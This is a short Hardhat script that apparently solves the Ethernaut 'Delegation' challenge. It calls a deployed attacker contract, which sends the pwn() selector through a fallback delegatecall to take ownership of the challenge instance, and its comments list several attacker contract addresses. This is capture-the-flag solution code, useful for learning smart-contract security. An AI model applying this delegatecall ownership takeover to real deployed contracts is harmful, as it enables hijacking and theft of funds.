const { ethers } = require("hardhat");

const INSTANCE_ADDRESS = "0xDa4dcAfdF11115a82D8965f73f08881EB033D980";
const ATTACKER_ADDRESS = "0x7FbCA6a3052E808f2746907601817f54F04d0E22";

// attacker: 0x1da6c53BCBac0E8b7c5B0C4e82A28AEBA3a83217
// gasAdded delegate attacker:  0x00d9BB43700396638Cd3CdE0E064C9CE9c88e373
// without gas delegate attacker: 0xA801Ce790316aa56425a565D93976C4626d6299E
// hardcoded: 0x7FbCA6a3052E808f2746907601817f54F04d0E22


// function selector of pwn()
const FUNCTION_SELECTOR = "0xdd365b8b"

async function main() {
    const delegationInstance = await ethers.getContractAt("Delegation", INSTANCE_ADDRESS);
    const attackerContract = await ethers.getContractAt("DelegateAttack", ATTACKER_ADDRESS);

    // Call the delegation instance to trigger the fallback function.
    // While sending this transaction, add function selector as msg.data
   const tx = await attackerContract.attack(delegationInstance.address);
   const txReceipt = await tx;

   console.log("tx: ", tx);
   console.log("txResp: ", txReceipt);

}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});